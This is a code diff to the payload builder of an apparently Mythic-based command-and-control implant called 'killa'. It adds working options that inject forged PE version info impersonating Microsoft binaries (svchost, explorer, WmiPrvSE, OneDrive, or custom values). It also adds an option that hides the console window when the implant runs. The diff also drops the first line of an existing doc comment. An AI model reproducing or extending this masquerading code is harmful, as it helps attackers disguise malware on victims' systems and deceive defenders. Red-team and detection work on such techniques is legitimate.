@@ -269,6 +269,49 @@ var payloadDefinition = agentstructs.PayloadType{
 			DefaultValue:  "10",
 			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
 		},
+		{
+			Name:          "masquerade_pe",
+			Description:   "Inject fake PE version info to disguise the binary as a legitimate Windows executable. Preset profiles inject CompanyName, FileDescription, InternalName and version matching the selected binary. 'custom' = use pe_company/pe_product/pe_description/pe_version fields. Windows .exe only.",
+			Required:      false,
+			DefaultValue:  "none",
+			Choices:       []string{"none", "svchost", "explorer", "wmi", "onedrive", "custom"},
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_CHOOSE_ONE,
+		},
+		{
+			Name:          "pe_company",
+			Description:   "Custom PE CompanyName (masquerade_pe=custom only). E.g. 'Microsoft Corporation'",
+			Required:      false,
+			DefaultValue:  "",
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
+		},
+		{
+			Name:          "pe_product",
+			Description:   "Custom PE ProductName (masquerade_pe=custom only). E.g. 'Microsoft Windows Operating System'",
+			Required:      false,
+			DefaultValue:  "",
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
+		},
+		{
+			Name:          "pe_description",
+			Description:   "Custom PE FileDescription (masquerade_pe=custom only). E.g. 'Host Process for Windows Services'",
+			Required:      false,
+			DefaultValue:  "",
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
+		},
+		{
+			Name:          "pe_version",
+			Description:   "Custom PE FileVersion and ProductVersion (masquerade_pe=custom only). E.g. '10.0.19041.1'",
+			Required:      false,
+			DefaultValue:  "",
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
+		},
+		{
+			Name:          "hide_console",
+			Description:   "Suppress the Windows console window (-H windowsgui). Prevents a visible terminal appearing on execution. Windows .exe only — no-op on other OS/modes.",
+			Required:      false,
+			DefaultValue:  false,
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
+		},
 	},
 	BuildSteps: []agentstructs.BuildStep{
 		{
@@ -286,6 +329,10 @@ var payloadDefinition = agentstructs.PayloadType{
 		{
 			Name:        "Entropy Analysis",
 			Description: "Analyzing payload entropy characteristics (informational only)",
+		},
+		{
+			Name:        "PE Metadata",
+			Description: "Injecting PE version info to masquerade as a legitimate Windows binary (go-winres)",
 		},
 		{
 			Name:        "Reporting back",
@@ -731,6 +778,14 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 	ldflags += fmt.Sprintf(" -X '%s.debug=%s'", killa_main_package, "false")
 	ldflags += " -buildid="
 
+	// Suppress console window for Windows executables (-H windowsgui).
+	// Not applicable to DLL/shellcode modes (they have no entry point console).
+	if hideConsole, cerr := payloadBuildMsg.BuildParameters.GetBooleanArg("hide_console"); cerr == nil && hideConsole {
+		if targetOs == "windows" && mode == "default-executable" {
+			ldflags += " -H windowsgui"
+		}
+	}
+
 	// Serialize builds: padding.bin is a shared file that must not be modified
 	// by concurrent goroutines between the write and the go build invocation.
 	buildMu.Lock()
@@ -929,6 +984,15 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 		StepStdout:  entropyOutput,
 	})
 
+	// PE Metadata injection: only for Windows executables, only when masquerade_pe != "none"
+	peMeta := applyPEMetadata(payloadBuildMsg, fmt.Sprintf("/build/%s", payloadName), targetOs, mode)
+	mythicrpc.SendMythicRPCPayloadUpdateBuildStep(mythicrpc.MythicRPCPayloadUpdateBuildStepMessage{
+		PayloadUUID: payloadBuildMsg.PayloadUUID,
+		StepName:    "PE Metadata",
+		StepSuccess: true,
+		StepStdout:  peMeta,
+	})
+
 	if payloadBytes, err := os.ReadFile(fmt.Sprintf("/build/%s", payloadName)); err != nil {
 		payloadBuildResponse.Success = false
 		payloadBuildResponse.BuildMessage = "Failed to find final payload"
@@ -1007,7 +1071,135 @@ func xorEncodeString(plaintext string, key []byte) string {
 	return base64.StdEncoding.EncodeToString(result)
 }
 
-// runYARAScan runs YARA rules against a built payload and returns a formatted report.
+// applyPEMetadata injects fake PE version info into a Windows executable using go-winres.
+// It only acts when masquerade_pe != "none" and targetOs == "windows" and mode == "default-executable".
+// Returns a human-readable report string for the Mythic build step.
+func applyPEMetadata(buildMsg agentstructs.PayloadBuildMessage, payloadPath, targetOs, mode string) string {
+	profile, err := buildMsg.BuildParameters.GetStringArg("masquerade_pe")
+	if err != nil || profile == "none" || profile == "" {
+		return "PE metadata injection skipped (masquerade_pe=none)"
+	}
+	if targetOs != "windows" || mode != "default-executable" {
+		return fmt.Sprintf("PE metadata injection skipped (only supported for Windows .exe, got OS=%s mode=%s)", targetOs, mode)
+	}
+
+	type versionInfo struct {
+		company     string
+		product     string
+		description string
+		version     string
+		internalName string
+	}
+
+	// Preset profiles matching real Windows binaries.
+	// Version strings match Windows 10 21H2 (build 19041).
+	presets := map[string]versionInfo{
+		"svchost": {
+			company:      "Microsoft Corporation",
+			product:      "Microsoft Windows Operating System",
+			description:  "Host Process for Windows Services",
+			version:      "10.0.19041.1",
+			internalName: "svchost.exe",
+		},
+		"explorer": {
+			company:      "Microsoft Corporation",
+			product:      "Microsoft Windows Operating System",
+			description:  "Windows Explorer",
+			version:      "10.0.19041.1",
+			internalName: "explorer.exe",
+		},
+		"wmi": {
+			company:      "Microsoft Corporation",
+			product:      "Microsoft Windows Operating System",
+			description:  "WMI Provider Host",
+			version:      "10.0.19041.1",
+			internalName: "WmiPrvSE.exe",
+		},
+		"onedrive": {
+			company:      "Microsoft Corporation",
+			product:      "Microsoft OneDrive",
+			description:  "Microsoft OneDrive",
+			version:      "23.184.0903.0001",
+			internalName: "OneDrive.exe",
+		},
+	}
+
+	var vi versionInfo
+	if profile == "custom" {
+		vi.company, _ = buildMsg.BuildParameters.GetStringArg("pe_company")
+		vi.product, _ = buildMsg.BuildParameters.GetStringArg("pe_product")
+		vi.description, _ = buildMsg.BuildParameters.GetStringArg("pe_description")
+		vi.version, _ = buildMsg.BuildParameters.GetStringArg("pe_version")
+		vi.internalName = ""
+		if vi.company == "" && vi.product == "" && vi.description == "" {
+			return "PE metadata injection skipped (masquerade_pe=custom but no pe_company/pe_product/pe_description provided)"
+		}
+	} else if preset, ok := presets[profile]; ok {
+		vi = preset
+	} else {
+		return fmt.Sprintf("PE metadata injection skipped (unknown profile: %q)", profile)
+	}
+
+	// Fallback version string if not provided
+	if vi.version == "" {
+		vi.version = "1.0.0.0"
+	}
+
+	// Build the winres JSON structure expected by `go-winres patch`.
+	// See: https://github.com/tc-hib/go-winres#json-format
+	winresJSON := fmt.Sprintf(`{
+  "RT_VERSION": {
+    "#1": {
+      "0000": {
+        "fixed": {
+          "file_version": %q,
+          "product_version": %q
+        },
+        "info": {
+          "0409": {
+            "CompanyName": %q,
+            "FileDescription": %q,
+            "FileVersion": %q,
+            "InternalName": %q,
+            "OriginalFilename": %q,
+            "ProductName": %q,
+            "ProductVersion": %q
+          }
+        }
+      }
+    }
+  }
+}`,
+		vi.version, vi.version,
+		vi.company,
+		vi.description,
+		vi.version,
+		vi.internalName,
+		vi.internalName,
+		vi.product,
+		vi.version,
+	)
+
+	// Write a temporary winres.json
+	tmpJSON := fmt.Sprintf("/tmp/winres_%s.json", buildMsg.PayloadUUID)
+	if writeErr := os.WriteFile(tmpJSON, []byte(winresJSON), 0644); writeErr != nil {
+		return fmt.Sprintf("PE metadata injection failed (could not write winres.json): %v", writeErr)
+	}
+	defer os.Remove(tmpJSON)
+
+	// Run: go-winres patch --in <payload> <winres.json>
+	cmd := exec.Command("go-winres", "patch", "--in", payloadPath, tmpJSON)
+	var outBuf, errBuf bytes.Buffer
+	cmd.Stdout = &outBuf
+	cmd.Stderr = &errBuf
+	if runErr := cmd.Run(); runErr != nil {
+		return fmt.Sprintf("PE metadata injection failed: %v\n%s", runErr, errBuf.String())
+	}
+
+	return fmt.Sprintf("PE metadata injected (profile=%s)\n  Company:     %s\n  Product:     %s\n  Description: %s\n  Version:     %s\n  Internal:    %s",
+		profile, vi.company, vi.product, vi.description, vi.version, vi.internalName)
+}
+
 // This is informational only — it never causes a build failure.
 func runYARAScan(payloadPath string) string {
 	rulesPath := "./yara_rules/killa_scan.yar"
